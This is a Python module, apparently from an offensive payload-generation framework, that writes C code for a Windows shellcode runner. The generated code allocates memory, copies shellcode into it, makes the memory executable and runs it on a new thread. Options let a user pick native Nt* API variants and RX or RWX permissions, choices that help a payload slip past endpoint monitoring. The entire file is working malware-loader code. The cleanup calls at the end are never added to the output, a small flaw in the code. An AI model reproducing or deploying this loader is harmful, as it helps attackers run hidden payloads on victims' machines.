from string import Template
from c.utils.functions import *
from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):

        parser = ArgumentParser(modulename='shellcoderunner')
        parser.add_argument(name='allocate', default='VirtualAlloc', help='Function used for allocating memory', choices={'VirtualAlloc', 'HeapAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx'})
        parser.add_argument(name='execute', default='CreateThread', help='Function used for executing shellcode', choices={'CreateThread', 'NtCreateThreadEx'})
        parser.add_argument(name='copy', default='memcpy', help='Function used for copying memory', choices={'memcpy', 'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='protect', default='VirtualProtect', help='Function used for changing memory protections', choices={'VirtualProtect', 'NtProtectVirtualMemory'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish', choices={'WaitForSingleObject', 'NtWaitForSingleObject'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle', 'NtClose'})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx', 'rwx'})
        self.args = parser.parse_args(arguments)        

        if self.args['perm'] == 'rx':
            self.memoryPermission = 'PAGE_EXECUTE_READ'
        else:
            self.memoryPermission = 'PAGE_EXECUTE_READWRITE'


    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>",
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = '{transformers}'

        if self.args['allocate'] == 'VirtualAlloc':
            template += VirtualAlloc('buffer', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
        elif self.args['allocate'] == 'HeapAlloc':
            template += HeapAlloc('buffer', 'HEAP_ZERO_MEMORY', '{shellcodeSize}')
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += NtAllocateVirtualMemory('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
        elif self.args['allocate'] == 'VirtualAllocEx':
            template += VirtualAllocEx('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')

        if self.args['copy'] == 'memcpy':
            template += memcpy('buffer', 'shellcode', '{shellcodeSize}')
        elif self.args['copy'] == 'NtWriteVirtualMemory':
            template += NtWriteVirtualMemory('(HANDLE)-1', 'buffer', 'shellcode', '{shellcodeSize}')
        elif self.args['copy'] == 'WriteProcessMemory':
            template += WriteProcessMemory('(HANDLE)-1', 'buffer', 'shellcode', '{shellcodeSize}')

        if self.args['protect'] == 'VirtualProtect':
            template += VirtualProtect('buffer', '{shellcodeSize}', self.memoryPermission)
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += NtProtectVirtualMemory('(HANDLE)-1', 'buffer', '{shellcodeSize}', self.memoryPermission)

        if self.args['execute'] == 'CreateThread':
            template += CreateThread('hThread', 'buffer')
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += NtCreateThreadEx('hThread', '(HANDLE)-1', 'buffer')

        if self.args['wait'] == 'WaitForSingleObject':
            template += WaitForSingleObject('hThread', 'INFINITE')
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += NtWaitForSingleObject('hThread', 'INFINITE')

        if self.args['close'] == 'CloseHandle':
            template += CloseHandle('hThread')
        elif self.args['close'] == 'NtClose':
            template += NtClose('hThread')

        if self.args['allocate'] == 'VirtualAlloc':
            VirtualFree('buffer')
        elif self.args['allocate'] == 'HeapAlloc':
            HeapFree('hHeap', 'buffer')
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            NtFreeVirtualMemory('(HANDLE)-1', 'buffer')

        return template